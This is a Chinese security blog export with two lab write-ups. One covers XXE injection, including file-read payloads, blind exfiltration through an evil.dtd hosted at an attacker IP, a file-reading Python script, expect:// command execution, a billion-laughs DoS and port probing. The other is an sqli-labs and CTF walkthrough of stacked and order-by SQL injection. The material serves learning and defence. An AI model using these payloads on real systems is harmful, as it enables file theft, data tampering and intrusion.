XML外部实体注入(XXE)"></a>0x05 XML外部实体注入(XXE)</h3><h4 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h4><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br> XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><p>解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。<br><a href="https://www.runoob.com/php/func-simplexml-load-string.html" target="_blank" rel="noopener">simplexml_load_string()</a>可以读取XML</p><h4 id="XXE本地搭建环境测试"><a href="#XXE本地搭建环境测试" class="headerlink" title="XXE本地搭建环境测试"></a>XXE本地搭建环境测试</h4><p>xxe.php</p><pre><code class="php">&lt;?php$xmlfile=file_get_contents(&#39;php://input&#39;);$dom=new DOMDocument();$dom-&gt;loadXML($xmlfile);$xml=simplexml_import_dom($dom);$xxe=$xml-&gt;xxe;$str=&quot;$xxe \n&quot;;echo $str;?&gt;</code></pre><ul><li><code>file_get_contents</code>获取客户端输入内容</li><li><code>new DOMDocument()</code>初始化XML解析器</li><li><code>loadXML($xmlfile)</code>加载客户端输入的XML内容</li><li><code>simplexml_import_dom($dom)</code>获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。</li><li>获取SimpleXMLElement对象中的节点XXE，然后输出XXE内容。</li></ul><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;file:///d://qwzf.txt&quot;&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&lt;/xml&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/2019113022532720.jpg" alt="在这里插入图片描述"></p><h4 id="XXE常见利用方式"><a href="#XXE常见利用方式" class="headerlink" title="XXE常见利用方式"></a>XXE常见利用方式</h4><p>与SQL相似，XXE漏洞也分为有回显和无回显<br>有回显，可以直接在页面中看到payload的执行结果或现象。<br>无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p><h5 id="1、读取任意文件"><a href="#1、读取任意文件" class="headerlink" title="1、读取任意文件"></a>1、读取任意文件</h5><p>首先准备一个有XXE漏洞的文件，这里以php文件为例<br>示例代码</p><pre><code class="php">&lt;?php$xml = simplexml_load_string($_REQUEST[&#39;xml&#39;]);print_r($xml);//注释掉该语句即为无回显的情况?&gt;</code></pre><p>构造payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY file SYSTEM &quot;file:///d://qwzf.txt&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;file;&lt;/name&gt;&lt;/root&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20191130233405565.jpg" alt="在这里插入图片描述"><br>读取文件，需URL编码后执行。<br>通过<strong>构造外部实体payload</strong>，在 xml 中 <code>&amp;file ;</code> 变成了外部文件<code>qwzf.txt</code>中内容，导致敏感信息泄露。<br><strong>靶场练习</strong><br>使用一下靶场练习回显读取文件和无回显读取文件：<a href="http://github.com/c0ny1/xxe-lab" target="_blank" rel="noopener">xxe-lab</a><br><img src="http://img-blog.csdnimg.cn/20191201004910357.jpg" alt="在这里插入图片描述"><br>输入，抓包发包，发现通过XML传输数据<br><img src="http://img-blog.csdnimg.cn/20191201005338552.jpg" alt="在这里插入图片描述"><br>php源码</p><pre><code class="php">&lt;?php$USERNAME = &#39;admin&#39;; //账号$PASSWORD = &#39;admin&#39;; //密码$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try{    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $username = $creds-&gt;username;    $password = $creds-&gt;password;    if($username == $USERNAME &amp;&amp; $password == $PASSWORD){        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);    }else{        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);    }    }catch(Exception $e){    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());}header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><ol><li>有回显</li></ol><p>构造payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM  &quot;file:///d:/qwzf.txt&quot;&gt;]&gt;&lt;user&gt;  &lt;username&gt;&amp;file;&lt;/username&gt;  &lt;password&gt;hack&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20191201010519864.jpg" alt="在这里插入图片描述"><br>当然，也可以使用<code>php://filter</code>协议读取qwzf.txt文件内容(也可以读取其他类型的文件，如：php文件)</p><pre><code class="php">php://filter/read=convert.base64-encode/resource=</code></pre><ol start="2"><li>无回显</li></ol><p>修改源码，禁掉输出代码和报错信息，改成无回显。<br><img src="http://img-blog.csdnimg.cn/20191201011459386.jpg" alt="在这里插入图片描述"><br>遇到无回显，可以通过<code>Blind XXE</code>方法加上外带数据通道来提取数据，先使用<code>php://filter</code>协议获取目标文件的内容，然后将内容以<code>http</code>请求发送到攻击服务器来读取数据。虽无法直接查看文件内容，但我们可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。即，当无回显情况时，可以将数据发送到远程服务器(攻击服务器)。</p><p>这里我使用的攻击机ip为：<code>192.168.201.128</code></p><p>构造payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/qwzf.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.201.128/evil.dtd&quot;&gt;%dtd;%send;]&gt;</code></pre><p>远程服务器部署evil.dtd内容为:</p><pre><code class="xml">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#39;http://192.168.201.128/?content=%file;&#39;&gt;&quot;&gt; %payload;</code></pre><p>%要进行实体编码<code>&amp;#x25</code><br>进行XXE攻击后，服务器会把文件内容发送到攻击者服务器(这里是ubantu的apache日志记录)<br><img src="http://img-blog.csdnimg.cn/20191201012728622.jpg" alt="在这里插入图片描述"><br>ubantu查看apache日志记录命令：</p><pre><code class="shell">tail -f /var/log/apache2/access.log</code></pre><p><em>无回显攻击流程：</em></p><ul><li>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</li><li>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</li><li>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上。</li></ul><p>这样就实现了外带数据的效果，解决 XXE 无回显的问题。</p><p><strong>使用并分析恶意脚本</strong><br>xxe2.php</p><pre><code class="php">&lt;?php$data = file_get_contents(&#39;php://input&#39;);$xml = simplexml_load_string($data);echo $xml-&gt;name;?&gt;</code></pre><p>读取文件.py</p><pre><code class="python">#!/usr/bin/python# -*- coding:utf-8 -*-import urllib2if __name__ == &#39;__main__&#39;:    print u&#39;输入要访问的地址，如http://127.0.0.1/xml/xxe2.php&#39;    url = raw_input()    count=1    while count==1:        print u&#39;输入要读取的文件，如file:///etc/passwd&#39;        payload = raw_input()        headers = {&#39;Content-type&#39;: &#39;text/xml&#39;}        xml = &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;&#39; + payload + &#39;&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;&#39;        req = urllib2.Request(url = url,headers = headers, data = xml)        res_data = urllib2.urlopen(req)        res = res_data.read()        print res</code></pre><p><img src="http://img-blog.csdnimg.cn/20191202134604155.png" alt="在这里插入图片描述"><br>通过urllib2的request方法用POST方式向目标地址发送XML数据，返回的数据即为服务器相关文件内容。</p><h5 id="2、执行系统命令"><a href="#2、执行系统命令" class="headerlink" title="2、执行系统命令"></a>2、执行系统命令</h5><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>通过XXE可以实现RCE的实例很少。</p><h5 id="3、拒绝服务攻击-Dos"><a href="#3、拒绝服务攻击-Dos" class="headerlink" title="3、拒绝服务攻击(Dos)"></a>3、拒绝服务攻击(Dos)</h5><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;   &lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><p><strong>原理</strong>：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p><h5 id="4、探测内网端口与攻击内网网站"><a href="#4、探测内网端口与攻击内网网站" class="headerlink" title="4、探测内网端口与攻击内网网站"></a>4、探测内网端口与攻击内网网站</h5><p><strong>探测内网端口</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>3306端口开放<br><img src="http://img-blog.csdnimg.cn/20191202142453986.jpg" alt="在这里插入图片描述"><br>3389端口未开放<br><img src="http://img-blog.csdnimg.cn/2019120214251588.jpg" alt="在这里插入图片描述"></p><p><strong>攻击内网网站</strong></p><pre><code class="php">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><h3 id="0x06-XXE漏洞防御"><a href="#0x06-XXE漏洞防御" class="headerlink" title="0x06 XXE漏洞防御"></a>0x06 XXE漏洞防御</h3><p><strong>1、使用开发语言提供的禁用外部实体的方法</strong><br>php:</p><pre><code class="php">libxml_disable_entity_loader(true);</code></pre><p>java:</p><pre><code class="java">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre><p>Python:</p><pre><code class="python">from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p><strong>2、过滤用户提交的XML数据</strong><br>过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。<br><strong>3、不允许XML中含有自己定义的DTD</strong></p><h3 id="0x07-后记"><a href="#0x07-后记" class="headerlink" title="0x07 后记"></a>0x07 后记</h3><p>总算把常见XML漏洞学完了，这里重点学习了XXE漏洞(XML外部实体注入)。整体来说，收获很大。</p><p>参考博客：<br><a href="https://www.cnblogs.com/xiaozi/p/5785165.html" target="_blank" rel="noopener">XML实体注入漏洞</a><br><a href="https://bbs.ichunqiu.com/thread-44650-1-7.html" target="_blank" rel="noopener">漏洞利用: XML外部实体（XXE）注入</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> XXE漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XML </tag>
            
            <tag> XML注入 </tag>
            
            <tag> Xpath注入 </tag>
            
            <tag> XXE漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs攻关5(Sta)(Less-39_Less-53)</title>
      <link href="/2019/11/16/sqli-labs%E6%94%BB%E5%85%B35(Sta)(Less-39_Less-53)/"/>
      <url>/2019/11/16/sqli-labs%E6%94%BB%E5%85%B35(Sta)(Less-39_Less-53)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>闲来无事，继续打sqlilabs，并总结相关知识。</p><h3 id="一、堆叠注入-Less-39-Less-45"><a href="#一、堆叠注入-Less-39-Less-45" class="headerlink" title="一、堆叠注入(Less-39-Less-45)"></a>一、堆叠注入(Less-39-Less-45)</h3><p>Stacked injection：堆叠注入(堆查询注入)</p><h4 id="堆叠注入的原理"><a href="#堆叠注入的原理" class="headerlink" title="堆叠注入的原理"></a>堆叠注入的原理</h4><p>在SQL中，分号<code>;</code>是用来表示一条sql语句的结束。试想一下我们在 <code>;</code> 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。</p><p>而union injection(联合注入)也是将两条语句合并在一起，两者之间有什么区别？<br>区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句(增删改查)。<br>例如：<br>用户输入<code>1; DELETE FROM products</code><br>服务器端生成的sql语句为：</p><pre><code class="sql">select * from prosducts where productid=1;DELETE FROM products</code></pre><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><h4 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h4><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制。<br>当然权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。<br>发现了一张图<br><img src="http://img-blog.csdnimg.cn/20191113194539659.png" alt="在这里插入图片描述"><br>上面说不支持<code>mysql/php</code>环境，但测试后发现支持，应该是版本的不同的原因。</p><p>堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。<br>因此，在读取数据时，建议使用union(联合)注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p><h4 id="堆叠注入的使用条件"><a href="#堆叠注入的使用条件" class="headerlink" title="堆叠注入的使用条件"></a>堆叠注入的使用条件</h4><p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用。<br>利用<a href="http://www.runoob.com/php/func-mysqli-multi-query.html" target="_blank" rel="noopener">mysqli_multi_query()</a>函数就支持多条sql语句同时执行。但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是<a href="http://www.runoob.com/php/func-mysqli-query.html" target="_blank" rel="noopener">mysqli_ query()</a>函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p><p>了解堆叠注入之后开始攻关</p><p><strong>Less-39</strong><br>测试后发现，为数字型。就借此再练习一下SQL语句吧！<br><em>增</em></p><pre><code class="sql">id=1;insert into users(id,username,password) values(39,&#39;Less39&#39;,&#39;Less39&#39;)--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191114191920236.jpg" alt="在这里插入图片描述"><br><em>删</em></p><pre><code class="sql">id=1;delete from users where id=39--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191114192920764.jpg" alt="在这里插入图片描述"><br><em>改</em></p><pre><code class="sql">id=1;update users set password=&#39;admin&#39; where id=8--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191114192834649.jpg" alt="在这里插入图片描述"><br><em>查</em></p><pre><code class="sql">id=1;select * from users where id=8--+</code></pre><p>发现浏览器上并没有显示查询结果。<br>于是想到堆叠注入的局限性：代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果。<br>因此，在读取数据时，可以使用union(联合)注入。</p><pre><code class="sql">id=0 union select 1,2,database()--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191114193711916.jpg" alt="在这里插入图片描述"><br><strong>Less-40</strong><br>查询源码，得到闭合方式为<code>&#39;)</code>。因为不会报错，需要用盲注猜测闭合方式。<br>如果只闭合<code>&#39;</code>，可以使用盲注来做题</p><pre><code class="sql">id=1&#39; and ascii(substr((select database()),1,1))&gt;-1 and &#39;1&#39;=&#39;1</code></pre><p>同样也可以用堆叠注入，参考Less-39<br><strong>Less-41</strong><br>同样是堆叠注入，不会报错，为数字型注入。参考Less-39<br><strong>Less-42</strong><br>看着好像二次注入的页面，更改密码页是二次注入。不再描述。</p><pre><code class="php">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);$password = $_POST[&quot;login_password&quot;];</code></pre><p>发现login_user被过滤，注入点应该在login_password。<a href="http://www.runoob.com/php/func-mysqli-real-escape-string.html" target="_blank" rel="noopener">mysqli_real_escape_string() </a><br>因为源码中，仍然有mysqli_multi_query()函数。所以可以继续使用堆叠注入,并且这是POST型堆叠注入，单引号闭合。创建一个等于users的test表</p><pre><code class="sql">login_user=admin&amp;login_password=1&#39;;create table test like users;--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191114200851864.jpg" alt="在这里插入图片描述"><br>创建成功，并且表为空<br><img src="http://img-blog.csdnimg.cn/20191114201140835.jpg" alt="在这里插入图片描述"><br>其他操作，类似。<br><strong>Less-43</strong><br>测试发现，闭合方式为<code>&#39;)</code>，其余参考Less-42<br><strong>Less-44</strong><br>这里没有了报错，但是注入语句还是一样的，可用盲注猜测闭合方式。也可以用其他方法猜测。<br>闭合方式<code>&#39;</code>，其他类似Less-42<br><strong>Less-45</strong><br>仍然是堆叠注入，不会报错，可用盲注猜测闭合方式。也可以用其他方法猜测。<br>闭合方式<code>&#39;)</code>，其他类似Less-42</p><h4 id="CTF例题实战"><a href="#CTF例题实战" class="headerlink" title="CTF例题实战"></a>CTF例题实战</h4><p>例题：[强网杯 2019]随便注<br>环境平台：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">BUUCTF</a><br><img src="http://img-blog.csdnimg.cn/20191120195529795.jpg" alt="在这里插入图片描述"><br>首先，先进行测试，发现单引号闭合。<br><img src="http://img-blog.csdnimg.cn/20191120195724760.jpg" alt="在这里插入图片描述"><br>然后使用几乎万能的明注方法–报错注入，发现一些关键字被过滤，只可以爆出数据库。<br><img src="http://img-blog.csdnimg.cn/20191120202534247.jpg" alt="在这里插入图片描述"><br>payload</p><pre><code class="sql">?inject=1&#39; and extractvalue(1,concat(0x7e,database(),0x7e))--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191120200740199.jpg" alt="在这里插入图片描述"><br>然后试下堆叠注入。因为一些关键字被过滤，所以应该可以使用没有被过滤的show关键字。<br><strong>爆库</strong></p><pre><code class="sql">inject=1&#39;;show databases;#</code></pre><p><img src="http://img-blog.csdnimg.cn/20191120203020623.jpg" alt="在这里插入图片描述"><br><strong>爆表</strong></p><pre><code class="sql">inject=1&#39;;show tables;#</code></pre><p><img src="http://img-blog.csdnimg.cn/2019112020315145.jpg" alt="在这里插入图片描述"><br><strong>爆字段</strong><br>先爆words表的字段</p><pre><code class="sql">inject=1&#39;;show columns from `words`;#</code></pre><p>没有有用信息，然后爆1919810931114514表的字段，发现flag字段</p><pre><code class="sql">inject=1&#39;;show columns from `1919810931114514`;#</code></pre><p><img src="http://img-blog.csdnimg.cn/2019112020375858.jpg" alt="在这里插入图片描述"><br><strong>爆数据</strong><br>最后爆数据，就应该能得到flag了，但我不会爆，于是看了大师傅的思路<br><em>思路一：</em></p><blockquote><p>1.将words表改名为word1或其它任意名字 :    rename table <code>words</code> to <code>word1</code>;<br>2.1919810931114514改名为words  :  rename table <code>1919810931114514</code> to <code>words</code>;<br>3.将新的word表插入一列，列名为id : alter table <code>words</code> add id int unsigned not Null auto_increment primary key;<br>4.将flag列改名为data : alert table <code>words</code> change <code>flag</code> <code>data</code> varchar(100);</p></blockquote><p>payload</p><pre><code class="sql">1&#39;;rename table `words` to `word1`;rename table `1919810931114514` to `words`;alter table `words` add id int unsigned not Null auto_increment primary key; alert table `words` change `flag` `data` varchar(100);#</code></pre><p>接着我们再用<code>1’ or 1=1 #</code>,查询就得到flag<br><img src="http://img-blog.csdnimg.cn/20191120210156423.jpg" alt="在这里插入图片描述"><br><em>思路二：</em><br>读取flag字段内的数据，我们要执行的目标语句是：</p><pre><code class="sql">select * from `1919810931114514`;</code></pre><p>而读取flag字段内的数据，需要绕过select的限制。可以使用<em>预编译</em>的方式。<br>预编译相关语法如下：</p><blockquote><p>set用于设置变量名和值 prepare用于预备一个语句，并赋予名称，以后可以引用该语句 execute执行语句 deallocate<br>prepare用来释放掉预处理的语句</p></blockquote><p>分析payload</p><pre><code class="sql">-1&#39;;set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);prepare stmt from @sql;EXECUTE stmt;#拆分payload：-1&#39;;set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);prepare stmt from @sql;EXECUTE stmt;#</code></pre><p>结果为：</p><pre><code class="sql">strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</code></pre><p>这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，将其大写即可。</p><pre><code class="sql">-1&#39;;Set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);Prepare stmt from @sql;EXECUTE stmt;#拆分payload：-1&#39;;Set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);Prepare stmt from @sql;EXECUTE stmt;#</code></pre><p><img src="http://img-blog.csdnimg.cn/20191121190449340.jpg" alt="在这里插入图片描述"></p><h3 id="二、order-by排序注入-Less-46-Less-53"><a href="#二、order-by排序注入-Less-46-Less-53" class="headerlink" title="二、order by排序注入(Less-46-Less-53)"></a>二、order by排序注入(Less-46-Less-53)</h3><h4 id="order-by排序"><a href="#order-by排序" class="headerlink" title="order by排序"></a>order by排序</h4><p>id升序排序：<code>select * from users order by id asc;</code><br>id降序排序：<code>select * from users order by id desc;</code></p><pre><code class="sql">mysql&gt; select * from users order by id asc;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  ||  6 | superman | genious    ||  7 | batman   | mob!le     ||  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 12 | dhakkan  | dumbo      || 14 | admin4   | admin4     |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt; select * from users order by id desc;+----+----------+------------+| id | username | password   |+----+----------+------------+| 14 | admin4   | admin4     || 12 | dhakkan  | dumbo      || 11 | admin3   | admin3     || 10 | admin2   | admin2     ||  9 | admin1   | admin1     ||  8 | admin    | admin      ||  7 | batman   | mob!le     ||  6 | superman | genious    ||  5 | stupid   | stupidity  ||  4 | secure   | crappy     ||  3 | Dummy    | p@ssword   ||  2 | Angelina | I-kill-you ||  1 | Dumb     | Dumb       |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt;</code></pre><p>其中<code>select * from users order by id desc;</code>的desc是可控的传参值。</p><h4 id="什么是order-by排序注入"><a href="#什么是order-by排序注入" class="headerlink" title="什么是order by排序注入"></a>什么是order by排序注入</h4><p>指可控制的位置在order by子句后，如下order参数可控：<code>select * from goods order by $_GET[&#39;order&#39;]</code></p><h4 id="注入判断"><a href="#注入判断" class="headerlink" title="注入判断"></a>注入判断</h4><p>在之前的注入利用<code>order by</code>子句进行快速猜解列数，再配合<code>union select</code>语句进行回显。在不知道列名的情况下可以通过列的的序号来指代相应的列。但是却无法做运算，如：<code>order=2-1</code> 和<code>order=1</code>是不一样的。</p><h4 id="本地测试环境"><a href="#本地测试环境" class="headerlink" title="本地测试环境"></a>本地测试环境</h4><pre><code class="php">&lt;?php//error_reporting(0);$mysql_server=&quot;localhost&quot;;$mysql_username=&quot;root&quot;;$mysql_userpass=&quot;xxxx&quot;;$mysql_select_db=&quot;test&quot;;$config=@mysqli_connect($mysql_server,$mysql_username,$mysql_userpass,$mysql_select_db)or die (mysql_error());if( isset( $_REQUEST[ &#39;order&#39; ]) ) {    $order = $_REQUEST[ &#39;order&#39; ];    $sql = &quot;select * from users order by id {$order};&quot;;    $result = mysqli_query($config,$sql) or die( $sql.&quot;&lt;pre&gt;&quot; . mysqli_error($config) . &quot;&lt;/pre&gt;&quot;);    $num = mysqli_num_rows( $result );    $i = 0;    while( $i &lt; $num ) {        $row = mysqli_fetch_array($result,MYSQLI_ASSOC);        echo &quot;&lt;pre&gt;id: {$row[&#39;Id&#39;]} usr: {$row[&#39;user&#39;]} passwd: {$row[&#39;password&#39;]}&lt;/pre&gt;&quot;;        $i++;    }    mysqli_close($config);}else{    echo &quot;set order&quot;;}?&gt;</code></pre><h4 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h4><p>构造出类似<code>and 1=1</code>、<code>and 1=2</code>的Payload以测试注入。</p><pre><code class="php">http://127.0.0.1/php/orderby.php?order=and if(1=1,user,password) //通过user字段排序http://127.0.0.1/php/orderby.php?order=and if(1=2,user,password) //通过password字段排序</code></pre><p><img src="http://img-blog.csdnimg.cn/2019111622060452.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191116220750933.png" alt="在这里插入图片描述"></p><pre><code class="php">http://127.0.0.1/php/orderby.php?order=and (CASE+WHEN+(1=1)+THEN+user+ELSE+password+END) //通过user字段排序http://127.0.0.1/php/orderby.php?order=and (CASE+WHEN+(1=1)+THEN+user+ELSE+password+END) //通过password字段排序http://127.0.0.1/php/orderby.php?order=and IFNULL(NULL,password) //通过user字段排序http://127.0.0.1/php/orderby.php?order=and IFNULL(NULL,user) //通过password字段排序</code></pre><p>可以观测到排序的结果不一样</p><pre><code class="php">http://127.0.0.1/php/orderby.php?order=and rand(1=1) http://127.0.0.1/php/orderby.php?order=and rand(1=2)</code></pre><h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="1、利用报错"><a href="#1、利用报错" class="headerlink" title="1、利用报错"></a>1、利用报错</h5><p><strong>1.返回多条记录</strong></p><pre><code class="php">?order=IF(1=1,1,(select+1+union+select+2)) //正确?order=IF(1=2,1,(select+1+union+select+2)) //错误?order=IF(1=1,1,(select+1+from+information_schema.tables))  //正常?order=IF(1=2,1,(select+1+from+information_schema.tables))  //错误</code></pre><p><strong>2.利用regexp</strong></p><pre><code class="php">?order=(select+1+regexp+if(1=1,1,0x00)) //正常?order=(select+1+regexp+if(1=2,1,0x00))  //错误</code></pre><p>通过下可以得知user()第一位为r,ascii码的16进制为0x72</p><pre><code 